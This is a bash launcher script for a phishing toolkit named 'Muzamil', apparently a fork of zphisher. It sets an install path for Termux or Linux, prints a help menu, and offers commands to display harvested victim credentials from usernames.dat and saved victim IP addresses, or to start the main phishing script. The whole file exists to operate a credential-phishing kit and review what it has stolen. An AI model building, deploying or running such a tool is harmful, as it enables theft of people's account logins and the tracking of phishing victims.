#!/bin/bash

# https://github.com/htr-tech/zphisher

if [[ $(uname -o) == *'Android'* ]];then
	MUZAMIL_ROOT="/data/data/com.termux/files/usr/opt/muzamil"
else
	export MUZAMIL_ROOT="/opt/muzamil"
fi

if [[ $1 == '-h' || $1 == 'help' ]]; then
	echo "To run Muzamil type \`muzamil\` in your cmd"
	echo
	echo "Help:"
	echo " -h | help : Print this menu & Exit"
	echo " -c | auth : View Saved Credentials"
	echo " -i | ip   : View Saved Victim IP"
	echo
elif [[ $1 == '-c' || $1 == 'auth' ]]; then
	cat $MUZAMIL_ROOT/auth/usernames.dat 2> /dev/null || { 
		echo "No Credentials Found !"
		exit 1
	}
elif [[ $1 == '-i' || $1 == 'ip' ]]; then
	cat $MUZAMIL_ROOT/auth/ip.txt 2> /dev/null || {
		echo "No Saved IP Found !"
		exit 1
	}
else
	cd $MUZAMIL_ROOT
bash ./muzamil.sh
fi
